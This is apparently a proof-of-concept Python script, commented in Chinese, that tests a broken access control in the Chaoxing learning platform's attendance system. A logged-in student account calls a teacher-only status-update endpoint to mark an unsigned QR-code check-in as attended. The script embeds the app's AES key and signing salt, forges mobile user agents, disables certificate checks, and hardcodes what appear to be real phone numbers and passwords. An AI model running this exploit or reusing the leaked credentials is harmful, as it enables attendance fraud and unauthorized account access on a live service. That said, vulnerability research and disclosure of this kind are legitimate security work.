import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def run():
    print("=" * 80)
    print(f"再次验证：未签二维码签到漏洞测试")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    # ========== TASK 1: 获取活动列表 ==========
    print("\n" + "=" * 80)
    print("[TASK 1] 获取最新活动列表，找到未签的二维码签到")
    print("=" * 80)

    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []
    print(f"  共 {len(active_list)} 个活动\n")

    # 找到未签到的签到活动
    unsigned_sign_aids = []
    for i, act in enumerate(active_list):
        aid = str(act.get("id", ""))
        nameTwo = act.get("nameTwo", "")
        groupId = act.get("groupId", -1)
        url = act.get("url", "")

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        sign_status = get_status(d)

        is_sign = groupId == 2 or "sign" in url.lower()
        if is_sign:
            status_str = f"已签status={sign_status}" if sign_status is not None else "🔴 未签到"
            print(f"  [{i}] aid={aid}, nameTwo={nameTwo[:40]}, {status_str}")
            if sign_status is None:
                unsigned_sign_aids.append(aid)

    print(f"\n  未签到的签到活动: {unsigned_sign_aids}")

    if not unsigned_sign_aids:
        print("  ⚠️ 没有找到未签到的签到活动！")
        return

    target_aid = unsigned_sign_aids[0]
    print(f"\n  目标活动: {target_aid}")

    # ========== TASK 2: 修改签到状态 ==========
    print("\n" + "=" * 80)
    print(f"[TASK 2] 学生调用 /newsign/updateSignStatus (aid={target_aid})")
    print("=" * 80)

    # 修改前查询
    r = s_s.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": target_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    orig_status = get_status(d)
    print(f"  修改前: status={orig_status}")
    print(f"  完整数据: {json.dumps(d, ensure_ascii=False)[:500]}")

    # 学生调用修改
    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": target_aid},
                 data={"uids": STUDENT_PUID, "status": "1", "remark": "",
                       "activeId": target_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"\n  修改status=1: {r.text}")

    time.sleep(2)

    # ========== TASK 3: 验证修改是否生效 ==========
    print("\n" + "=" * 80)
    print("[TASK 3] 验证修改是否生效")
    print("=" * 80)

    # 学生端查询
    r = s_s.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": target_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    after_status = get_status(d)
    print(f"  学生端查询: status={after_status}")
    print(f"  完整数据: {json.dumps(d, ensure_ascii=False)[:500]}")

    # 教师V2确认
    r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": target_aid},
                 data={"uids": STUDENT_PUID, "status": "1", "remark": ""},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"\n  教师V2确认: {r.text}")

    time.sleep(1)

    # 最终查询
    r = s_s.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": target_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    final_status = get_status(d)
    print(f"\n  最终状态: status={final_status}")
    print(f"  完整数据: {json.dumps(d, ensure_ascii=False)[:500]}")

    # 教师端查询
    r = s_t.get(f"{base}/v2/apis/sign/signIn",
                params={"activeId": target_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    teacher_status = get_status(d)
    print(f"  教师端查询: status={teacher_status}")

    # 正常签到对比
    r = s_s.post(f"{base}/pptSign/stuSignajax",
                 data={"activeId": target_aid, "uid": puid_s, "classId": CLASS_ID,
                       "courseId": COURSE_ID, "lat": "", "lon": "", "address": ""},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                 timeout=20)
    print(f"\n  正常签到(stuSignajax): {r.text}")

    # 汇总
    print("\n" + "=" * 80)
    print("[汇总]")
    print("=" * 80)
    print(f"  活动ID: {target_aid}")
    print(f"  修改前: status={orig_status}")
    print(f"  修改后: status={after_status}")
    print(f"  最终:   status={final_status}")
    print(f"  教师端: status={teacher_status}")
    if final_status == 1 or teacher_status == 1:
        print(f"\n  🔴🔴🔴 漏洞确认！学生成功将未签到的二维码签到修改为出勤！")
    else:
        print(f"\n  ❌ 修改未生效，需要进一步分析")

if __name__ == "__main__":
    run()
